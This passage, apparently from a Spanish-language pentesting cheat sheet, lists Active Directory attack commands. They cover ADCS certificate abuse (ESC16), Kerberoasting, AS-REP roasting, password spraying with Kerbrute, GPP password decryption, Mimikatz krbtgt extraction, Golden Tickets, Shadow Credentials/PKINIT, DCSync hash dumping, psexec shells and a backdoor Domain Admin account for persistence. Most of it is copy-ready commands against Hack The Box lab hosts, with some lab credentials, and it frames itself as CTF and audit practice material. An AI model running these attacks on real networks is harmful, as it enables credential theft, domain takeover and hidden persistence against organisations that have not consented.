+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">certipy</span><span style="color:#F1FA8C"> req</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> pass</span><span style="color:#BD93F9"> -ca</span><span style="color:#F1FA8C"> ca.nombre.local</span><span style="color:#BD93F9"> -template</span><span style="color:#F1FA8C"> vulnerable_template</span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -target</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
+<h3 id="mssql-content-headersalthash">MSSQL—> Content Header:Salt:Hash</h3>
+<p>Para romper hashes de contraseñas de SQL Server, puedes usar herramientas como <code>hashcat</code> o <code>john</code>:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4"># Con hashcat (modo 1731 para MSSQL 2012+)</span></span>
+<span class="line"><span style="color:#50FA7B">hashcat</span><span style="color:#BD93F9"> -m</span><span style="color:#BD93F9"> 1731</span><span style="color:#BD93F9"> --force</span><span style="color:#BD93F9"> -a</span><span style="color:#BD93F9"> 0</span><span style="color:#F1FA8C"> hash.mssql</span><span style="color:#F1FA8C"> diccionario.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Con John the Ripper</span></span>
+<span class="line"><span style="color:#50FA7B">john</span><span style="color:#BD93F9"> --format=mssql12</span><span style="color:#BD93F9"> --wordlist=diccionario.txt</span><span style="color:#F1FA8C"> hash.mssql</span></span></code></pre>
+<blockquote>
+<p><strong>Nota:</strong> El modo 1731 corresponde a hashes de SQL Server 2012 en adelante (<code>mssql12</code> en John).</p>
+</blockquote>
+<p>El procedimiento extendido <code>xp_cmdshell</code> permite ejecutar comandos del sistema operativo directamente desde SQL Server. Esto puede facilitar la escalada de privilegios o la persistencia.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#6272A4">-- Permite ejecutar comandos del sistema desde MSSQL</span></span>
+<span class="line"><span style="color:#FF79C6">EXEC</span><span style="color:#F8F8F2"> xp_cmdshell </span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">whoami</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">;</span></span></code></pre>
+<p>Para automatizar esto con Metasploit:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">use</span><span style="color:#F1FA8C"> auxiliary/admin/mssql/mssql_exec</span></span></code></pre>
+<blockquote>
+<p><strong>Precaución:</strong> <code>xp_cmdshell</code> suele estar deshabilitado por defecto. Se requiere acceso privilegiado para activarlo.</p>
+</blockquote>
+<h3 id="mimikatzexe">Mimikatz.exe</h3>
+<p>Con Mimikatz puedes extraer y manipular secretos del sistema, como el hash de la cuenta <code>krbtgt</code> necesario para generar Golden Tickets:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">lsadump::lsa</span><span style="color:#F1FA8C"> /inject</span><span style="color:#F1FA8C"> /name:krbtgt</span></span></code></pre>
+<blockquote>
+<p>Este comando requiere privilegios de SYSTEM. Una vez obtenido el hash, puede utilizarse para falsificar tickets TGT con herramientas como <code>ticketer.py</code> de Impacket.</p>
+</blockquote>
+<p>Obtenemos el ID y NTLM y creamos el ticket.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>kerberos::golden /domain:enterprise.com /sid:ID /rc4:NTLM /user:Administrator /ticket:ticket</span></span></code></pre>
+<hr>
+<h3 id="as--rep-roasting-attack">AS -REP Roasting Attack</h3>
+<p>Solo requiere listado de usuarios.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-GetNPUsers -dc-ip IP(AD) dominio.com/ -no-pass -userfile users.txt -outfile salida.txt</span></span></code></pre>
+<p>Para crackear la contraseña.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hashcat --help | grep AS_REP --> 18200</span></span></code></pre>
+<p>Para ver si corre base de datos</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nmap -n -P0 -p 1433 -sV --open -vv IP(AD)</span></span></code></pre>
+<p>Obtener credenciales.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>crackmapexec mssql IP(AD) -u usuarios.txt -p diccionario.txt --local-auth --continue-on-success</span></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>msfconsole -q</span></span>
+<span class="line"><span>use auxiliary/admin/mssql/mssql_sql</span></span>
+<span class="line"><span>set RHOST IP(AD)</span></span>
+<span class="line"><span>set PASSWORD</span></span>
+<span class="line"><span>set SQL select password.hash from sys.sql_logins</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>#caracteristicas de la base de datos</span></span>
+<span class="line"><span>use auxiliary/admin/mssql/mssql_enum</span></span></code></pre>
+<h3 id="kerbrute">Kerbrute</h3>
+<p>Poner <code>/etc/hosts</code>.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>IP nombre_dominio nombre_PC nombre_PC.nombre_dominio</span></span></code></pre>
+<p>Al instalar le damos permisos de ejecución. Vemos usuarios posibles.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.71 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</span></span></code></pre>
+<p>Hacemos password-spraying.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.35 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</span></span></code></pre>
+<p>Ahora fuerza bruta de contraseñas.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>./kerbrute_linux_amd64 bruteuser -d cicada.htb --dc 10.10.11.35 pass.txt emily.oscars</span></span></code></pre>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p>Explicación de cada tipo de ataque</p>
+<ul>
+<li><strong>AS-REP Roasting:</strong> Se enfoca en usuarios que no requieren preautenticación. Permite obtener hashes de contraseñas directamente desde los tickets AS-REP, que luego se pueden crackear offline.</li>
+<li><strong>Kerberoasting:</strong> Aprovecha cuentas de servicio con SPNs registrados. Obtienes tickets TGS que se pueden crackear offline para revelar contraseñas de cuentas de servicio con privilegios.</li>
+<li><strong>Pass-the-Ticket (PTT):</strong> Permite usar tickets Kerberos válidos capturados para autenticarse como otro usuario sin necesidad de conocer su contraseña.</li>
+<li><strong>Golden Ticket:</strong> Permite crear un ticket TGT falso con control completo del dominio, otorgando acceso ilimitado a cualquier recurso.</li>
+<li><strong>Silver Ticket:</strong> Similar al Golden Ticket, pero limitado a un servicio específico. Permite autenticarse como cualquier usuario para un recurso concreto sin alertar al DC.</li>
+<li><strong>Request TGS de un SPN específico:</strong> Permite obtener un ticket de servicio para un SPN concreto y luego usarlo en movimientos laterales o escalamiento de privilegios.</li>
+</ul>
+<p>Windows solía permitir almacenar contraseñas en texto cifrado (pero fácilmente descifrable) en archivos XML dentro de políticas de grupo (GPP) en controladores de dominio. Aunque esta práctica fue desaconsejada desde hace tiempo, aún se encuentran entornos vulnerables.</p>
+<p>Utiliza la herramienta <code>smbmap</code> para conectarse al recurso compartido SMB del host con IP 10.10.10.100. A través del argumento <code>--download</code> se solicita la descarga del archivo <code>Groups.xml</code> ubicado en el directorio <code>Policies</code>, específicamente dentro de la ruta correspondiente a una política de grupo activa. Este archivo es relevante porque dentro de los controladores de dominio, las GPO pueden contener credenciales administrativas mal configuradas, particularmente dentro del directorio SYSVOL, el cual suele estar accesible para cualquier usuario del dominio, lo que representa una seria vulnerabilidad si se almacenan contraseñas en él.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml</span></span></code></pre>
+<p>Mostrar el contenido completo del archivo XML descargado.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>cat 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml</span></span></code></pre>
+<p>Desciframos.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ'</span></span></code></pre>
+<p>Si tenemos un usuario con su contraseña dentro de un dominio vemos si es vulnerable. Antes de eso sincronizamos.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ntpdate 10.10.10.100 (IP máquina víctima)</span></span></code></pre>
+<p>Intento obtener el Ticket Granting Service.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request</span></span></code></pre>
+<p>Crackeamos.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>john --wordlist=rockyou.txt hash.txt</span></span></code></pre>
+<p>Teniendo la contraseña deshasheada.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'</span></span></code></pre>
+<p>Ahora conseguir una shell.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span></code></pre>
+<h3 id="shadow-credentials--pkinit-attack">Shadow Credentials / PKINIT Attack</h3>
+<p>Obtener control de una <strong>cuenta de servicio</strong> en Active Directory sin conocer la contraseña, usando <strong>shadow credentials</strong>, <strong>PKINIT</strong>, TGT Kerberos y hash NTLM.</p>
+<hr>
+<h4 id="1️⃣-preparación--permisos">1️⃣ Preparación / Permisos 🟡</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Herramienta / Comando</th></tr></thead><tbody><tr><td>Agregar <code>p.agila</code> al grupo Service Accounts</td><td><code>net rpc group addmem "Service Accounts" "p.agila" -U "dc01.fluffy.htb/p.agila" -S "10.10.11.69"</code></td></tr></tbody></table>
+<p><strong>Emoji / Color:</strong> 🟡 amarillo → manipulación de AD / permisos</p>
+<hr>
+<h4 id="2️⃣-shadow-credentials">2️⃣ Shadow Credentials 🟢</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Herramienta / Comando</th></tr></thead><tbody><tr><td>Listar shadow credentials existentes de <code>winrm_svc</code></td><td><code>python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "list"</code></td></tr><tr><td>Agregar nueva credencial shadow (certificado)</td><td><code>python3 pywhisker.py -d "dc01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add" --filename key --export PEM</code></td></tr><tr><td>Generar archivos PEM (certificado y clave privada)</td><td><code>key_cert.pem</code> y <code>key_priv.pem</code></td></tr></tbody></table>
+<p><strong>Emoji / Color:</strong> 🟢 verde → PKINIT / Kerberos</p>
+<hr>
+<h4 id="qué-son-los-credential-shadows-en-active-directory">¿Qué son los <strong>Credential Shadows</strong> en Active Directory?</h4>
+<p><strong>Credential Shadows</strong> son un tipo de <strong>credencial adicional asociada a una cuenta de servicio o usuario</strong> en Active Directory.</p>
+<ul>
+<li>
+<p><strong>Función principal:</strong> Permitir que una cuenta se autentique usando <strong>certificados, claves o secretos alternativos</strong> sin modificar la contraseña principal.</p>
+</li>
+<li>
+<p>Se usan típicamente para <strong>servicios automatizados</strong>, como:</p>
+<ul>
+<li>
+<p>WinRM</p>
+</li>
+<li>
+<p>SQL Server</p>
+</li>
+<li>
+<p>Otros servicios de Windows que requieren autenticación programática.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Se almacenan como <strong>atributos especiales en AD</strong>, vinculados a la cuenta de servicio.</p>
+</li>
+<li>
+<p>Pueden ser <strong>certificados X.509</strong> que permiten autenticación Kerberos usando <strong>PKINIT</strong>, o claves simétricas/secretos para otros sistemas.</p>
+</li>
+</ul>
+<hr>
+<h4 id="3️⃣-solicitar-tgt-con-pkinit">3️⃣ Solicitar TGT con PKINIT 🟢</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Solicitar TGT usando certificado</td><td><code>faketime '2025-08-11 17:31:36' python3 gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache</code></td></tr><tr><td>Configurar variable de entorno para usar el TGT</td><td><code>export KRB5CCNAME=winrm_svc.ccache</code></td></tr></tbody></table>
+<p><strong>Nota:</strong> El TGT permite autenticarse como la cuenta de servicio sin contraseña.</p>
+<hr>
+<h4 id="qué-es-pkinit">¿Qué es <strong>PKINIT</strong>?</h4>
+<p><strong>PKINIT</strong> significa <strong>Public Key Cryptography for Initial Authentication in Kerberos</strong>.</p>
+<ul>
+<li>
+<p>Es una <strong>extensión de Kerberos</strong> que permite usar <strong>criptografía de clave pública</strong> para autenticarse en lugar de solo usar contraseñas.</p>
+</li>
+<li>
+<p>Básicamente, permite que un usuario o servicio obtenga un <strong>TGT (Ticket Granting Ticket)</strong> usando un <strong>certificado X.509</strong> y su clave privada.</p>
+</li>
+</ul>
+<hr>
+<h4 id="-cómo-funciona">🔹 Cómo funciona</h4>
+<ol>
+<li>
+<p>La cuenta de usuario o servicio tiene un <strong>certificado y clave privada</strong> registrados en Active Directory (p. ej., mediante shadow credentials).</p>
+</li>
+<li>
+<p>Durante la autenticación Kerberos inicial:</p>
+<ul>
+<li>
+<p>El cliente envía un mensaje <strong>firmado con su clave privada</strong>.</p>
+</li>
+<li>
+<p>El controlador de dominio verifica el mensaje usando la <strong>clave pública asociada</strong> en AD.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Si es válido, el DC emite un <strong>TGT</strong> para esa cuenta, igual que con la autenticación normal por contraseña.</p>
+</li>
+</ol>
+<hr>
+<h4 id="4️⃣-extraer-hash-ntlm-desde-tgt">4️⃣ Extraer hash NTLM desde TGT 🟢</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Extraer hash NTLM</td><td><code>faketime '2025-08-11 17:34:24' python3 getnthash.py -key 7e2b09cc396441f397108358ee1a443b205052bd0535a03af66bc3cadbd91b82 fluffy.htb/winrm_svc</code></td></tr></tbody></table>
+<hr>
+<h4 id="-qué-son-los-hashes-ntlm">🔹 ¿Qué son los <strong>hashes NTLM</strong>?</h4>
+<p><strong>NTLM (NT LAN Manager)</strong> es un <strong>protocolo de autenticación</strong> de Microsoft que todavía se usa en Windows, especialmente cuando Kerberos no está disponible.</p>
+<ul>
+<li>
+<p>Un <strong>hash NTLM</strong> es básicamente <strong>una representación cifrada de la contraseña de un usuario</strong>.</p>
+</li>
+<li>
+<p>No es la contraseña en texto claro, pero sirve para <strong>autenticarse en servicios de Windows</strong> que aceptan NTLM, como SMB, RPC o WinRM.</p>
+</li>
+</ul>
+<hr>
+<h4 id="-cómo-funciona-1">🔹 Cómo funciona</h4>
+<ol>
+<li>
+<p>Windows almacena un <strong>hash NTLM</strong> de cada contraseña en la base de datos SAM o en Active Directory.</p>
+</li>
+<li>
+<p>Cuando un usuario intenta autenticarse:</p>
+<ul>
+<li>
+<p>El servidor envía un <strong>reto (challenge)</strong>.</p>
+</li>
+<li>
+<p>El cliente combina el <strong>hash NTLM</strong> con el reto para generar una respuesta.</p>
+</li>
+<li>
+<p>El servidor compara la respuesta con lo que espera y, si coincide, permite el acceso.</p>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>Importante: nunca se envía la contraseña real por la red, solo el hash usado para el challenge-response.</p>
+</blockquote>
+<hr>
+<h4 id="5️⃣-uso-del-hash-ntlm--movimiento-lateral">5️⃣ Uso del hash NTLM / Movimiento lateral 🔵</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Comprobar acceso SMB con hash</td><td><code>nxc smb dc01.fluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'</code></td></tr><tr><td>Movimiento lateral y escalamiento</td><td>Usar hash NTLM en servicios accesibles, SMB, RPC o WinRM</td></tr></tbody></table>
+<p><strong>Emoji / Color:</strong> 🔵 azul → SMB / lateral movement</p>
+<hr>
+<h4 id="6️⃣-flujo-resumido-paso-a-paso">6️⃣ Flujo resumido paso a paso</h4>
+<ol>
+<li>
+<p>🟡 <strong>Preparación AD:</strong></p>
+<ul>
+<li>Usuario p.agila obtiene permisos en Service Accounts.</li>
+</ul>
+</li>
+<li>
+<p>🟢 <strong>Shadow Credentials:</strong></p>
+<ul>
+<li>Listar credenciales shadow de <code>winrm_svc</code>.</li>
+<li>Agregar certificado shadow.</li>
+<li>Generar archivos PEM (key_cert.pem &#x26; key_priv.pem).</li>
+</ul>
+</li>
+<li>
+<p>🟢 <strong>PKINIT / TGT:</strong></p>
+<ul>
+<li>Solicitar TGT Kerberos usando certificado.</li>
+<li>Configurar variable KRB5CCNAME.</li>
+</ul>
+</li>
+<li>
+<p>🟢 <strong>Extraer NTLM:</strong></p>
+<ul>
+<li>Sacar hash NTLM desde el TGT.</li>
+</ul>
+</li>
+<li>
+<p>🔵 <strong>SMB / Movimiento lateral:</strong></p>
+<ul>
+<li>Usar hash NTLM para autenticarse en SMB o RPC.</li>
+<li>Escalar privilegios o moverse lateralmente.</li>
+</ul>
+</li>
+<li>
+<p>🔴 <strong>Objetivo final:</strong></p>
+<ul>
+<li>Control total de la cuenta de servicio <code>winrm_svc</code>.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="-notas-finales">🔹 Notas finales</h4>
+<ul>
+<li>Este ataque se llama <strong>Shadow Credentials / PKINIT Attack</strong>.</li>
+<li>Combina <strong>PKINIT + shadow credentials + TGT Kerberos + hash NTLM</strong>.</li>
+<li>Muy usado en <strong>CTFs de Active Directory</strong> y auditorías de seguridad avanzada.</li>
+<li>La chuleta permite <strong>tener todos los comandos y pasos en un solo documento</strong> listo para práctica.</li>
+</ul>
+<h3 id="adcs-esc16-attack-ctf">ADCS ESC16 Attack (CTF)</h3>
+<h4 id="1️⃣-enumeración-de-adcs">1️⃣ Enumeración de ADCS 🟡</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Encontrar CA y plantillas vulnerables</td><td><code>certipy-ad find -u 'ca_svc@fluffy.htb' -hashes &#x3C;hash> -dc-ip 10.10.11.69 -vulnerable -stdout</code></td></tr></tbody></table>
+<p><strong>Emoji / Color:</strong> 🟡 amarillo → descubrimiento / enumeración</p>
+<hr>
+<h4 id="2️⃣-leer-upn-de-la-víctima">2️⃣ Leer UPN de la víctima 🟢</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Leer UPN de la cuenta <code>ca_svc</code></td><td><code>faketime '&#x3C;fecha>' certipy-ad account -u "p.agila@fluffy.htb" -p "&#x3C;pass>" -dc-ip "10.10.11.69" -user 'ca_svc' read</code></td></tr></tbody></table>
+<p><strong>Emoji / Color:</strong> 🟢 verde → recopilación de atributos de AD</p>
+<hr>
+<h4 id="3️⃣-actualizar-upn-temporalmente">3️⃣ Actualizar UPN temporalmente 🟢</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Cambiar UPN de <code>ca_svc</code> a la cuenta de destino (<code>administrator</code>)</td><td><code>faketime '&#x3C;fecha>' certipy-ad account -u "p.agila@fluffy.htb" -p "&#x3C;pass>" -dc-ip "10.10.11.69" -upn 'administrator' -user 'ca_svc' update</code></td></tr></tbody></table>
+<hr>
+<h4 id="4️⃣-solicitar-certificado-vulnerable">4️⃣ Solicitar certificado vulnerable 🟢</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Solicitar certificado como <code>administrator</code> usando plantilla vulnerable</td><td><code>faketime '&#x3C;fecha>' certipy-ad req -u "ca_svc@dc01.fluffy.htb" -hashes "&#x3C;hash>" -ca 'fluffy-DC01-CA' -template User -upn "administrator@sc01.fluffy.htb" -dc-ip "10.10.11.69"</code></td></tr></tbody></table>
+<hr>
+<h4 id="5️⃣-revertir-upn-de-la-cuenta-víctima">5️⃣ Revertir UPN de la cuenta víctima 🔵</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Restaurar UPN original de <code>ca_svc</code></td><td><code>faketime '&#x3C;fecha>' certipy-ad account -u "p.agila@dc01.fluffy.htb" -p "&#x3C;pass>" -dc-ip "10.10.11.69" -upn 'ca_svc@$dc01.fluffy.htb' -user 'ca_svc' update</code></td></tr></tbody></table>
+<hr>
+<h4 id="6️⃣-autenticación-como-cuenta-de-destino">6️⃣ Autenticación como cuenta de destino 🔴</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Acción</th><th>Comando</th></tr></thead><tbody><tr><td>Autenticar con el certificado obtenido</td><td><code>faketime '&#x3C;fecha>' certipy-ad auth -dc-ip "10.10.11.69" -pfx 'administrator.pfx'</code></td></tr></tbody></table>
+<p><strong>Emoji / Color:</strong> 🔴 rojo → cuenta de alto privilegio</p>
+<hr>
+<h4 id="-notas">🔹 Notas</h4>
+<ul>
+<li>Técnica: <strong>ADCS ESC16 (Certificate Template Abuse)</strong>.</li>
+<li>Permite <strong>escalamiento de privilegios</strong> sin conocer la contraseña de la cuenta de destino.</li>
+<li>Muy útil en <strong>CTFs y auditorías avanzadas de AD</strong>.</li>
+</ul>
+<hr>
+<h3 id="privilegios-de-dominio-dcsync--dc-takeover">Privilegios de dominio (DCSync / DC takeover)</h3>
+<ul>
+<li>DCSync (si privilegios lo permiten)</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">impacket-secretsdump</span><span style="color:#BD93F9"> -just-dc</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">&#x3C;pass></span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># o con hash:</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">impacket-secretsdump</span><span style="color:#BD93F9"> -just-dc</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -hashes</span><span style="color:#F1FA8C"> :</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">NTL</span><span style="color:#F8F8F2">M</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li>Dump local SAM/LSA en hosts comprometidos</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">impacket-secretsdump</span><span style="color:#BD93F9"> -sam</span><span style="color:#F1FA8C"> sam.save</span><span style="color:#BD93F9"> -system</span><span style="color:#F1FA8C"> system.save</span><span style="color:#BD93F9"> -security</span><span style="color:#F1FA8C"> security.save</span><span style="color:#F1FA8C"> LOCAL</span></span>
+<span class="line"></span></code></pre>
+<p><strong>Notas/Evidencia:</strong></p>
+<ul>
+<li>DCSync exitoso: sí/no ; hashes: …</li>
+</ul>
+<hr>
+<h3 id="dominio-del-dominio">Dominio del Dominio</h3>
+<h3 id="51-dcsync-attack">5.1 DCSync Attack</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">impacket-secretsdump</span><span style="color:#BD93F9"> -just-dc</span><span style="color:#F1FA8C"> dominio.local/usuario:password@10.10.10.100</span></span>
+<span class="line"></span></code></pre>
+<h3 id="52-golden-ticket-attack">5.2 Golden Ticket Attack</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Obtener hash krbtgt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">impacket-secretsdump</span><span style="color:#BD93F9"> -just-dc-ntlm</span><span style="color:#F1FA8C"> dominio.local/usuario:password@10.10.10.100</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Crear golden ticket con mimikatz</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">kerberos::golden</span><span style="color:#F1FA8C"> /domain:dominio.local</span><span style="color:#F1FA8C"> /sid:S-1-5-21-...</span><span style="color:#F1FA8C"> /rc4:</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">NTLM_krbtg</span><span style="color:#F8F8F2">t</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> /user:Administrator</span><span style="color:#F1FA8C"> /ticket:golden.tkt</span></span>
+<span class="line"></span></code></pre>
+<h3 id="53-persistencia">5.3 Persistencia</h3>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Crear usuario backdoor</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">net</span><span style="color:#F1FA8C"> user</span><span style="color:#F1FA8C"> backdoor</span><span style="color:#F1FA8C"> Password123!</span><span style="color:#F1FA8C"> /add</span><span style="color:#F1FA8C"> /domain</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">net</span><span style="color:#F1FA8C"> group</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Domain Admins</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"> backdoor</span><span style="color:#F1FA8C"> /add</span><span style="color:#F1FA8C"> /domain</span></span>
+<span class="line"></span></code></pre>
+<hr>
